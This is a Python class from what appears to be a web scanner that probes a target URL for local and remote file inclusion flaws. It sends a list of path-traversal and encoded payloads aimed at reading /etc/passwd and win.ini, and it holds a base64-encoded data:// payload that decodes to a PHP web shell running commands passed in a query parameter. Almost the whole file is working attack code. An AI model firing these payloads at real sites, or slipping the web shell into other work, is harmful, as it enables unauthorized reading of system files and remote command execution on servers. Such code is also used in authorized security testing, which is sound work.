import requests
from urllib.parse import urljoin, urlencode

class xfiController():

    def __init__(self):
        # list of payload: https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
        self.lfiPayload = [
            '../../etc/passwd',
            'etc/passwd%00',
            '../../../../../../../../etc/passwd',
            'C:\\Windows\\win.ini',
            '../../../../etc/passwd',
            '../../../..//etc/passwd',
            '../../../../..//etc/passwd',
            '../../../../../..//etc/passwd',
            '../../../../../../..//etc/passwd',
            '../../../../../../../..//etc/passwd',
            'php://filter/resource=/etc/passwd',
            '%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd',
            '%2e%2e%2f',
            '%252e%252e%252f',
            '%c0%ae%c0%ae%c0%af',
            '%uff0e%uff0e%u2215',
            '%uff0e%uff0e%u2216',
        ]
        self.rfiPayload = [
            'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=',
        ]

    def lfi(self, config):
        for payload in self.lfiPayload:
            full_url = config['url'] + payload
            try:
                response = requests.get(full_url)
                if response.status_code == 200 and ('open_basedir' in response.text or 'root' in response.text):
                    print(f'[!] Potential LFI vulnerability detected with payload: {payload}')
                elif response.status_code == 200 and 'malicious' in response.text:
                    print(f'[!] Potential RFI vulnerability detected with payload: {payload}')
            except requests.RequestException as e:
                print(f'[!] Error testing payload {payload}: {e}')

    def rfi(self):
        print(self.rfiPayload)

        